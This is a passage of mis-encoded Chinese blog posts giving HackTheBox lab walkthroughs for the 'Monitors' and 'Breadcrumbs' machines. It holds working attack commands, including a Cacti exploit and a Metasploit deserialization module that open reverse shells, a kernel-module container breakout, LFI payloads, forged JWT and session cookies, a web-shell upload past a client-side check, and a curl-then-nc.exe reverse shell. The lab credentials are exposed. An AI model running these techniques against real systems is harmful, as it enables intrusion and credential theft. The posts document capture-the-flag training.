/etc/hosts\n```\nç„¶åå’±ä»¬è®¿é—®ä¸€ä¸‹[http://cacti-admin.monitors.htb/](http://cacti-admin.monitors.htb/)\n\n![](Hackthebox-Monitors/cd8d7411-2fdb-41ee-8f54-50367629e98d.png)\n\nè¿™ä¸ªä»™äººæŒç•Œé¢ï¼Œæˆ‘ä¼°è®¡æˆ‘ä»¬ä¹‹å‰è¯»å–åˆ°çš„è´¦å·å¯†ç å¯ä»¥èµ·ä½œç”¨äº†\n\nç”¨æˆ·åï¼šadmin\n\nå¯†ç ï¼šBestAdministrator@2020!\n\n![](Hackthebox-Monitors/9b99eb19-688f-4b0e-9619-c515a416a944.png)\n\nå¯æ€»ç®—æ˜¯ç™»å½•è¿›åå°äº†\n\n![](Hackthebox-Monitors/20d52fb9-1658-4681-a827-910d9193319d.png)\n\nè®©æˆ‘ä»¬ç‚¹ä¸€ä¸‹è¿™ä¸ªä»™äººæŒæ£€æŸ¥ä¸€ä¸‹ç‰ˆæœ¬\n\n![](Hackthebox-Monitors/49a83570-a8d3-421b-a9b2-527de6e4a617.png)\n\nç‰ˆæœ¬1.2.12\n\n![](Hackthebox-Monitors/d0ab04e5-ffcc-4a08-8ffd-60dcbe9ac6d9.png)\n\nåœ¨githubä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªç›¸å…³çš„é—®é¢˜\n\næ¼æ´ç¼–å· CVE-2020-14295\n\nè¿™é‡Œæ˜¯ç¡®å®šå­˜åœ¨ä¸€ä¸ªæ³¨å…¥æ¼æ´ï¼Œè®©æˆ‘ä»¬æ¥å°è¯•ä¸€ä¸‹\n\nä½¿ç”¨è¯¥exploit\n\n> [https://www.exploit-db.com/exploits/49810](https://www.exploit-db.com/exploits/49810)\n\nçœ‹çœ‹æ˜¯å¦å¯ä»¥ç›´æ¥è·å¾—ä¸€ä¸ªshell\n\n```bash\npython3 exploit.py -t http://cacti-admin.monitors.htb -u admin -p \"BestAdministrator@2020\\!\" --lhost 10.10.14.163 --lport 4444\n```\ntips:æ­¤å¤„å¯†ç çš„æ„Ÿå¹å·è¦ç”¨åæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œä¸ç„¶ä¼šè¢«ç¼–è¯‘æ‰\n\n![](Hackthebox-Monitors/636aa853-e834-4487-bb44-3b7db7abcd70.png)\n\n![](Hackthebox-Monitors/08a8b82b-8515-40a1-be7d-c975b0ecf363.png)\n\næˆåŠŸè·å¾—ä¸€ä¸ªshell\n\nå¯ä»¥ä½¿ç”¨python3 -c \"import pty;pty.spawn('/bin/bash')\";è·å–ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell\n\n# **æƒé™æå‡**\n![](Hackthebox-Monitors/b59d0937-aa7a-475a-afc4-971cd3513bb1.png)\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåªæœ‰marcusçš„ç›®å½•å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ‰€ä»¥å’±ä»¬è‚¯å®šæ˜¯è¦è·å–è¿™ä¸ªç”¨æˆ·çš„æƒé™äº†\n\n```bash\ngrep 'marcus' /etc -R 2>/dev/null\n```\nå’±ä»¬æŸ¥æ‰¾ä¸€ä¸‹ç›¸å…³çš„æ–‡ä»¶\n\n![](Hackthebox-Monitors/78452e90-55e9-4a15-87c1-066f5d4d8e12.png)\n\nå’±ä»¬æ‰¾åˆ°ä¸€ä¸ªè„šæœ¬\n\n```bash\n/home/marcus/.backup/backup.sh\n```\næŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Monitors/cd22e91f-5da5-4bd8-855d-852849b6a858.png)\n\nå’±ä»¬è·å¾—äº†ä¸€ä¸ªå¯†ç \n\n```bash\nVerticalEdge2020\n```\nåº”è¯¥æ˜¯marcusç”¨æˆ·çš„å¯†ç ï¼Œå’±ä»¬å»ä½¿ç”¨sshç™»å½•è¯•è¯•\n\n```bash\nssh [marcus@10.10.10.238](mailto:marcus@10.10.10.238)\n```\n![](Hackthebox-Monitors/a6b0100d-1464-4c6c-8b90-00417cfab93e.png)\n\nç™»å½•æˆåŠŸ\n\n![](Hackthebox-Monitors/495e7f62-7e19-492f-8a33-6808eaaa313d.png)\n\næˆåŠŸè·å¾—useræƒé™çš„flag\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹note.txtæ–‡ä»¶\n\n![](Hackthebox-Monitors/83a8630e-2de7-41dc-ada8-7745f033e9d6.png)\n\nè¿™ä¸ªæç¤ºæåˆ°äº†dockerï¼Œé‚£å’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹dockerå§\n\nps aux|grep docker\n\n![](Hackthebox-Monitors/17860965-cb90-4cd7-86c2-d9221bfda1b7.png)\n\næˆ‘çœ‹åˆ°ä¸€ä¸ªä½¿ç”¨ docker-proxy è¿è¡Œçš„ docker å®¹å™¨ã€‚æ‰€ä»¥æˆ‘æœç´¢äº†ä¸€äº›å…³äº dokcer-proxy çš„ä¿¡æ¯\n\næˆ‘æ‰¾åˆ°çš„å‚è€ƒæ–‡æœ¬\n\n> [https://docs.docker.com/network/proxy/](https://docs.docker.com/network/proxy/)\n\né˜…è¯»æ–‡æœ¬åï¼ŒçŸ¥é“äº†ä½¿ç”¨docker-proxyå¯ä»¥é€šè¿‡ä»£ç†è¿è¡Œdockerå®¹å™¨ã€‚\n\nçŸ¥é“è¿™ä¸ªä¿¡æ¯åï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æœ‰æ— æ³•ä»å¤–éƒ¨è®¿é—®çš„ç«¯å£è¿è¡Œç€\n\n```bash\nnetstat -an\n```\n![](Hackthebox-Monitors/4fd619b1-ee7f-484c-98ca-7fe529f2e472.png)\n\næœ‰ä¸€ä¸ª8443ç«¯å£\n\nè¿™åº”è¯¥å°±æ˜¯docker-proxyæ­£åœ¨ä¾¦å¬çš„ç«¯å£äº†ï¼Œæˆ‘ä»¬ä½¿ç”¨sshåˆ›å»ºä¸€ä¸ªä»£ç†éš§é“\n\n```bash\nssh -L 8443:127.0.0.1:8443 [marcus@10.10.10.238](mailto:marcus@10.10.10.238)\n```\n![](Hackthebox-Monitors/7bf1d374-d52c-4dcf-bd33-fcf3456c1241.png)\n\nç„¶åå’±ä»¬å»è®¿é—®[https://127.0.0.1:8443](https://127.0.0.1:8443/)\n\n![](Hackthebox-Monitors/47f6404c-7c58-4e29-90b4-86c1a231c536.png)\n\nä¼šçœ‹åˆ°æœ‰ä¸€ä¸ªtomcatæœåŠ¡å™¨\n\nå°è¯•åœ¨GoogleæŸ¥æ‰¾æ¼æ´åï¼Œç»è¿‡åŠªåŠ›æ‰¾åˆ°äº†ä¸€ä¸ªJava ååºåˆ—åŒ–\n\n> [https://www.rapid7.com/db/modules/exploit/linux/http/apache\\_ofbiz\\_deserialization/](https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization/)\n\nå¦‚ä¸Šæ‰€è¿°ï¼Œæˆ‘å°†ä½¿ç”¨msfç›´æ¥è¿›è¡Œæ”»å‡»\n\n```bash\nmsfconsoleå¯åŠ¨msf\nexploit/linux/http/apache_ofbiz_deserialization\nset rhosts 127.0.0.1\nset lhost 10.10.14.163\nset lport 5555\nset ForceExploit true\nexploit\n```\n![](Hackthebox-Monitors/e82b6c37-75cc-4570-a263-49329aeedcc9.png)\n\nå’±ä»¬æˆåŠŸåˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ä»¥rootæƒé™åœ¨dockerä¸Šè·å¾—äº†ä¸€ä¸ªshell\n\nè¾“å…¥shellè¿›å…¥æƒé™\n\nè¾“å…¥capsh --printæŸ¥çœ‹å®¹å™¨çš„åŠŸèƒ½\n\n![](Hackthebox-Monitors/050754f0-6dca-4c45-845d-65d397fca9d8.png)\n\nä½ ä»¬çŒœçŒœæˆ‘å‘ç°äº†å•¥ï¼Ÿ\n\ndockerå…·æœ‰SYS\\_MODULEæƒé™ã€‚å› æ­¤ï¼Œå®¹å™¨å¯ä»¥åœ¨dockerä¸»æœºçš„å†…æ ¸ä¸­æ’å…¥/åˆ é™¤å†…æ ¸æ¨¡å—\n\nç„¶åæˆ‘æœç´¢äº† docker sys\\_module çš„æ¼æ´ï¼Œè¿˜çœŸæ‰¾åˆ°äº†\n\n> [https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd?gi=c12387585c2)\n\næ ¹æ®æ–‡ç« æç¤ºï¼Œæˆ‘åˆ¶ä½œäº†ä¸¤ä¸ªè„šæœ¬\n\n![](Hackthebox-Monitors/69510738-7fcc-41f0-9ccc-2e864e10acfe.png)\n\nè®°å¾—ä¿®æ”¹IPåœ°å€å’Œç«¯å£ï¼Œæˆ‘è¿™é‡Œå¿˜è®°ä¿®æ”¹äº†\n\nç„¶åæŠŠè„šæœ¬ä¸Šä¼ åˆ°dockeré‡Œ\n\n```bash\npython -c \"import pty;pty.spawn('/bin/bash')\";\n```\né¦–å…ˆä½¿ç”¨pythonè·å¾—ä¸€ä¸ªç¨³å®šçš„shell\n\nç„¶åè¿›å…¥/rootç›®å½•\n\n![](Hackthebox-Monitors/e55fadc6-fb2d-43b7-92f8-2576ab004146.png)\n\nåœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\nç„¶åä½¿ç”¨wgetä¸‹è½½ä¸¤ä¸ªè„šæœ¬\n\n![](Hackthebox-Monitors/5d88a727-941b-441c-a79d-8735ce6ce821.png)\n\nè¾“å…¥make all\n\n![](Hackthebox-Monitors/53721ed2-33c5-4546-91e1-dba8d2d1e6f1.png)\n\nè¾“å‡ºäº†å¾ˆå¤šçš„æ–‡ä»¶ï¼Œä½†æˆ‘ä»¬åªéœ€è¦reverse-shell.ko\n\né¦–å…ˆæˆ‘ä»¬ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åä½¿ç”¨insmod reverse-shell.koè¿è¡Œæˆ‘ä»¬è¦çš„æ–‡ä»¶\n\n![](Hackthebox-Monitors/7227cc74-0f62-4bee-baa4-587bfda77351.png)\n\næˆåŠŸææƒåˆ°root\n\n![](Hackthebox-Monitors/31f2739d-d6ee-4dbe-9558-9deabe3ea1a4.png)\n\næˆåŠŸè·å¾—rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰\n\nè¿™å‡ å¤©æ²¡æœ‰æ›´æ–°ï¼Œæ˜¯å› ä¸ºè¢«æŸå‚æ¶å¿ƒäº†ä¸€æŠŠï¼Œè®©æˆ‘è‡ªæˆ‘æ€€ç–‘äº†ä¸€ä¸‹ä»¥ä¸ºæˆ‘è‡ªå·±çœŸçš„å¾ˆèœã€‚\n\nä½†ç»è¿‡æˆ‘æ—¶å€™ä»¥åå‘ç°ï¼Œå…¶å®æˆ‘æ›´èœï¼\n\næ²¡æƒ³åˆ°å§ï¼Œå“å˜¿\n\nå‘ç°æˆ‘è‡ªå·±æ›´èœä»¥åï¼Œæˆ‘å°±å¯ä»¥æ”¾å¿ƒçš„ç¡è§‰äº†ï¼Œå¤§å®¶æ™šå®‰","tags":["Hackthebox"]},{"title":"Breadcrumbs - Hackthebox","url":"/2021/06/19/Hackthebox/Hard/Hackthebox-Breadcrumbs/","content":"\n# Hackthebox - Breadcrumbs\n# **é¶åœºä¿¡æ¯**\n![](Hackthebox-Breadcrumbs/52c6e1e5-c429-4907-bb22-2e74f3543e76.png)\n\n# **é¶åœºç±»å‹**\n![](Hackthebox-Breadcrumbs/fe9be17b-7d8c-46ec-9094-d13ffef02788.png)\n\n# **ä¿¡æ¯æœé›†**\n## Nmap\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```cpp\nnmap -A -sS -sC -sV 10.10.10.228\n```\n```cpp\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV 10.10.10.228\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 13:47 CST\nNmap scan report for 10.10.10.228\nHost is up (0.25s latency).\nNot shown: 993 closed ports\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey:\n| 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)\n| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)\n|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)\n80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)\n| http-cookie-flags:\n| /:\n| PHPSESSID:\n|_ httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1\n|_http-title: Library\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)\n| http-cookie-flags:\n| /:\n| PHPSESSID:\n|_ httponly flag not set\n|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1\n|_http-title: Library\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after: 2019-11-08T23:48:47\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_ http/1.1\n445/tcp open microsoft-ds?\n3306/tcp open mysql?\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=39016%PV=Y%DS=2%DC=T%G=Y%TM=60CD853\nOS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=\nOS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS\nOS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%\nOS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=\nOS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S\nOS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=\nOS:Z)\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results:\n|_clock-skew: 11m52s\n| smb2-security-mode:\n| 2.02:\n|_ Message signing enabled but not required\n| smb2-time:\n| date: 2021-06-19T06:00:15\n|_ start_date: N/A\nTRACEROUTE (using port 53/tcp)\nHOP RTT ADDRESS\n1 248.74 ms 10.10.14.1\n2 248.83 ms 10.10.10.228\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 59.03 seconds\n```\nå¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¶æœºå¼€å¯äº†22ã€80ã€135ã€139ã€443ã€445ã€3306ç«¯å£\n\nå’±ä»¬è®¿é—®ä¸€ä¸‹80ç«¯å£\n\n## Http\n![](Hackthebox-Breadcrumbs/0c44ebc9-2d5a-4e9c-826d-8d157e58289c.png)\n\nç‚¹å‡»check booksçœ‹çœ‹\n\n![](Hackthebox-Breadcrumbs/91ed5a94-ca42-4ba8-9b0f-79b561b540cf.png)\n\næŸ¥æ‰¾å›¾ä¹¦ï¼Œå’±ä»¬éšä¾¿æŸ¥æ‰¾ä¸€ä¸ª\n\n![](Hackthebox-Breadcrumbs/1db3f872-a271-4883-88fc-698438ba9e7f.png)\n\n![](Hackthebox-Breadcrumbs/3b5ef4b7-fe1b-4869-9e7f-265995871b6f.png)\n\nå’±ä»¬æ‹¦æˆªä¸€ä¸ªåŒ…çœ‹çœ‹\n\n![](Hackthebox-Breadcrumbs/ad7b8f75-0e74-4598-aec3-f068f1e3b7f6.png)\n\nçœ‹åˆ°æœ‰ä¸ªå‚æ•°bookï¼Œæ˜¯è¯»å–ç½‘é¡µçš„ï¼Œé‚£æ˜¯å¦å­˜åœ¨LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰å‘¢ï¼Ÿæµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Breadcrumbs/41d28654-7825-451b-ad8a-4a7246297a72.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæç¤ºçš„æ˜¯æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¡®å®å­˜åœ¨LFI\n\nåªä¸è¿‡å’±ä»¬è¦è®¿é—®çš„é¡µé¢åœ¨ä¸Šçº§ç›®å½•é‡Œè€Œå·²ï¼Œå’±ä»¬æµ‹è¯•ä¸€ä¸‹\n\n![](Hackthebox-Breadcrumbs/d80ea596-7693-40b9-972a-292d73beaad2.png)\n\n# **æ¼æ´åˆ©ç”¨**\nniceï¼Œè¯¥æ¼æ´ç¡®å®æ˜¯å­˜åœ¨çš„ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨\n\nç”±äºè¿™æ˜¯ä¸€å°windowsçš„æœºå™¨ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹ä»–è‡ªèº«å­˜åœ¨çš„ä¸€äº›æ–‡ä»¶\n\n```cpp\n../../../../../../WINDOWS/system32/drivers/etc/hosts\n```\n![](Hackthebox-Breadcrumbs/10a5ca60-30ff-44da-9965-be1aa9d17a5e.png)\n\n```cpp\n\"# Copyright (c) 1993-2009 Microsoft Corp.\\r\\n#\\r\\n# This is a sample HOSTS file used by Microsoft TCP\\/IP for Windows.\\r\\n#\\r\\n# This file contains the mappings of IP addresses to host names. Each\\r\\n# entry should be kept on an individual line. The IP address should\\r\\n# be placed in the first column followed by the corresponding host name.\\r\\n# The IP address and the host name should be separated by at least one\\r\\n# space.\\r\\n#\\r\\n# Additionally, comments (such as these) may be inserted on individual\\r\\n# lines or following the machine name denoted by a '#' symbol.\\r\\n#\\r\\n# For example:\\r\\n#\\r\\n# 102.54.94.97 rhino.acme.com # source server\\r\\n# 38.25.63.10 x.acme.com # x client host\\r\\n\\r\\n# localhost name resolution is handled within DNS itself.\\r\\n#\\t127.0.0.1 localhost\\r\\n#\\t::1 localhost\\r\\n\"\n```\næˆ‘ä»¬ä¹‹å‰ä»é”™è¯¯ä¸­çœ‹åˆ°äº†å…³äºbookController.phpæ‰€ä»¥è®©æˆ‘ä»¬å°è¯•è¯»å–æ–‡ä»¶\n\n```cpp\n../../../../../../Users/www-data/Desktop/xampp/htdocs/includes/bookController.php\n```\n![](Hackthebox-Breadcrumbs/d0dc533d-0bbe-4544-8794-45564041fb64.png)\n\n```cpp\n\"<?php\\r\\n\\r\\nif($_SERVER['REQUEST_METHOD'] == \\\"POST\\\"){\\r\\n $out = \\\"\\\";\\r\\n require '..\\/db\\/db.php';\\r\\n\\r\\n $title = \\\"\\\";\\r\\n $author = \\\"\\\";\\r\\n\\r\\n if($_POST['method'] == 0){\\r\\n if($_POST['title'] != \\\"\\\"){\\r\\n $title = \\\"%\\\".$_POST['title'].\\\"%\\\";\\r\\n }\\r\\n if($_POST['author'] != \\\"\\\"){\\r\\n $author = \\\"%\\\".$_POST['author'].\\\"%\\\";\\r\\n }\\r\\n \\r\\n \\r\\n $query = \\\"SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\\\";\\r\\n $stmt = $con->prepare($query);\\r\\n $stmt->bind_param('ss', $title, $author);\\r\\n $stmt->execute();\\r\\n $res = $stmt->get_result();\\r\\n $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\\r\\n }\\r\\n\\r\\n elseif($_POST['method'] == 1){\\r\\n $out = file_get_contents('..\\/books\\/'.$_POST['book']);\\r\\n }\\r\\n\\r\\n else{\\r\\n $out = false;\\r\\n }\\r\\n\\r\\n echo json_encode($out);\\r\\n}\"\n```\nè¿™æ—¶å€™çº¿ç´¢åˆæŒ‡å‘äº†\\$out = \"\";\\\\r\\\\n require '../db/db.php\n\nå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹db.phpæ–‡ä»¶\n\n```cpp\n../../../../../../Users/www-data/Desktop/xampp/htdocs/db/db.php\n```\n![](Hackthebox-Breadcrumbs/2b3097a9-cef7-4b5c-a3cd-9f82bc00acbf.png)\n\n```cpp\n\"<?php\\r\\n\\r\\n$host=\\\"localhost\\\";\\r\\n$port=3306;\\r\\n$user=\\\"bread\\\";\\r\\n$password=\\\"jUli901\\\";\\r\\n$dbname=\\\"bread\\\";\\r\\n\\r\\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\\r\\n?>\\r\\n\"\n```\næˆåŠŸå¾—åˆ°äº†3306ç«¯å£çš„è´¦å·å¯†ç \n\n```cpp\nusername = bread\npassword = jUli901\n```\nå’±ä»¬å°è¯•ç™»å½•åˆ°mysql\n\n![](Hackthebox-Breadcrumbs/d5afa7bf-eb09-4436-af09-02861f771fe2.png)\n\næç¤ºå¤±è´¥\n\nå’±ä»¬æ¢ä¸ªæ€è·¯ï¼Œè¯»å–ä»–çš„loginé¡µé¢ï¼Œå®¡è®¡ä¸€ä¸‹ç™»å½•é€»è¾‘\n\n```cpp\n../portal/login.php\n```\n![](Hackthebox-Breadcrumbs/43d19e87-34aa-4c2e-a1ce-39bcaa158388.png)\n\nå’±ä»¬ç»™ä»–å¤åˆ¶å‡ºæ¥å®¡è®¡ä¸€ä¸‹\n\n![](Hackthebox-Breadcrumbs/a4170031-69e7-4bfd-a1e1-d73231400c84.png)\n\nå’±ä»¬å‘ç°å®ƒæ­£åœ¨ä½¿ç”¨authController.phpæ–‡ä»¶ï¼Œå’±ä»¬ç»§ç»­è¿½è¸ªè¿‡å»çœ‹çœ‹\n\n![](Hackthebox-Breadcrumbs/44803c4c-843f-43ba-a03a-1b7538ab9cea.png)\n\nå’±ä»¬çœ‹åˆ°å®ƒæœ‰ä½¿ç”¨ä¸€æ®µkeyï¼Œå’±ä»¬å¤åˆ¶å‡ºæ¥çœ‹çœ‹\n\n```cpp\n$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'\n```\nå’±ä»¬è¿˜èƒ½çœ‹åˆ°ï¼Œå®ƒæœ‰ä½¿ç”¨ä¸€ä¸ªJWTä»¤ç‰Œï¼Œè¿™ä¸ªä¹‹å‰å’±ä»¬ç”¨åˆ°è¿‡çš„\n\nåŒæ—¶è¿˜è°ƒç”¨äº†ä¸€ä¸ªcookie.phpé¡µé¢ï¼Œå’±ä»¬ç»§ç»­è¿½è¸ªçœ‹çœ‹\n\n![](Hackthebox-Breadcrumbs/1d036af7-380f-415e-a33b-fafc464698ac.png)\n\n```cpp\n\"<?php\\r\\n\\/**\\r\\n * @param string $username Username requesting session cookie\\r\\n * \\r\\n * @return string $session_cookie Returns the generated cookie\\r\\n * \\r\\n * @devteam\\r\\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\\r\\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\\r\\n * *\\/\\r\\nfunction makesession($username){\\r\\n $max = strlen($username) - 1;\\r\\n $seed = rand(0, $max);\\r\\n $key = \\\"s4lTy_stR1nG_\\\".$username[$seed].\\\"(!528.\\/9890\\\";\\r\\n $session_cookie = $username.md5($key);\\r\\n\\r\\n return $session_cookie;\\r\\n}\"\n```\næš‚æ—¶åˆ°è¿™çº¿ç´¢å°±æ–­äº†ï¼Œå’±ä»¬å»çœ‹çœ‹portalç›®å½•ä¸‹è¿˜æœ‰å•¥å§\n\n![](Hackthebox-Breadcrumbs/a91f8d84-1038-4fd1-b7a4-642a483a8180.png)\n\nè¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªfiles.phpæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Breadcrumbs/5d1e5788-3ae4-4edf-8596-9bc5a84b3eee.png)\n\nä¸å‡ºæ„å¤–çš„è¯ï¼Œfilesçš„ç”¨æˆ·åº”è¯¥æ˜¯pauläº†\n\nå»JWT.ioåˆ›å»ºä¸€ä¸ªä»¤ç‰Œ\n\n```cpp\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU\n```\nå’±ä»¬å»ç™»å½•\n\n![](Hackthebox-Breadcrumbs/1c27ba84-3462-495e-9ce4-3867f9f4ac53.png)\n\néšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œç„¶åæ›¿æ¢JWTä»¤ç‰Œ\n\n```cpp\n<?php\n$username = \"paul\";\n$max = strlen($username) -1;\n$seed = rand(0, $max);\n$key = \"s4lTy_stR1nG_\".$username[$seed].\"(!528./9890\";\n$session_cookie = $username.md5($key);\necho $session_cookie;\n?>\n```\nä½¿ç”¨è¯¥è„šæœ¬è·å–sessionè¿›è¡Œæ›¿æ¢\n\n```cpp\nfor i in {0..5};do php session.php;echo '';sleep 1;done\n```\n![](Hackthebox-Breadcrumbs/35ce4295-a80f-44d4-80c4-864ad0172bfa.png)\n\n![](Hackthebox-Breadcrumbs/a31640c3-37a8-4034-96f4-09e82c28a072.png)\n\næˆåŠŸç™»å½•ä¸ºpaulè´¦æˆ·\n\nFile managementä¼¼ä¹åªå…è®¸.zipæ ¼å¼çš„æ–‡ä»¶\n\nå’±ä»¬ä¸Šä¼ ä¸€ä¸ªphpshell\n\n> https://github.com/LucifielHack/p0wny-shell\n\n![](Hackthebox-Breadcrumbs/ff713ca2-8b56-4f81-a701-d529027a2219.png)\n\nä¸Šä¼ çš„æ—¶å€™ ä¼šè‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ ä¸Š.zip\n\nå’±ä»¬åœ¨æœ€æœ«å°¾å†æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ª.phpå³å¯ç»•è¿‡\n\nè¿™åªæ˜¯ä¸ªå‰ç«¯éªŒè¯\n\n![](Hackthebox-Breadcrumbs/fd0780be-9f1a-4f5b-be25-9a4431f2d1e8.png)\n\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ªphpshell\n\næ­¤å¤„æœ‰ä¸¤ä¸ªæ–¹æ³•å¾—åˆ°ä¸€ä¸ªshell\n\n## æ–¹æ³•ä¸€ï¼š\næŸ¥çœ‹C:\\\\Users\\\\www-data\\\\Desktop\\\\xampp\\\\htdocs\\\\portal\\\\pizzaDeliveryUserDataç›®å½•ä¸‹çš„juliette.jsonæ–‡ä»¶ï¼Œå³å¯å¾—åˆ°ä¸€ä¸ªè´¦å·å¯†ç ï¼Œè¿›è¡ŒSSHç™»å½•\n\n```cpp\ntype juliette.json\n\nusername = juliette\npassword = jUli901./())!\n```\n## æ–¹æ³•äºŒï¼š\næœ¬åœ°ä½¿ç”¨python3æ­å»ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåœ¨phpshellå†…ä½¿ç”¨curlè¿›è¡Œä¸‹è½½nc.exeï¼Œç„¶åä½¿ç”¨ncè¿›è¡Œshellåå¼¹\n\næœ¬æœºè¿è¡Œ\n\n```cpp\npython3 -m http.server 80\nnc -nvlp 4444\nphpshellè¿è¡Œ\ncurl [http://localhost/nc.exe -o nc.exe](http://localhost/nc.exe%20-o%20nc.exe)\nnc.exe localhost 4444 -e cmd.exe\n```\nè¿™é‡Œçœ‹å¤§å®¶è‡ªå·±å–œæ¬¢ä»€ä¹ˆæ–¹å¼äº†\n\n![](Hackthebox-Breadcrumbs/7abb2910-c2e7-45bf-b3cc-7f8fd1c28113.png)\n\næˆåŠŸè·å¾—usersæƒé™çš„flag\n\n# **æƒé™æå‡**\n![](Hackthebox-Breadcrumbs/68b774bf-97a6-4448-bab6-34b94f75d3fd.png)\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹æ¡Œé¢ä¸Štodo.htmlçš„å†…å®¹\n\nå®ƒå£°æ˜å®ƒå°†å¯†ç å­˜å‚¨åœ¨åä¸º Microsoft Store Sticky Notes çš„ç¨‹åºä¸­\n\nå’±ä»¬æ‰¾è¿‡å»\n\nå‚è€ƒé“¾æ¥\n\n> [https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10](https://www.thewindowsclub.com/where-are-sticky-notes-saved-in-windows-10)\n\n```cpp\ncd 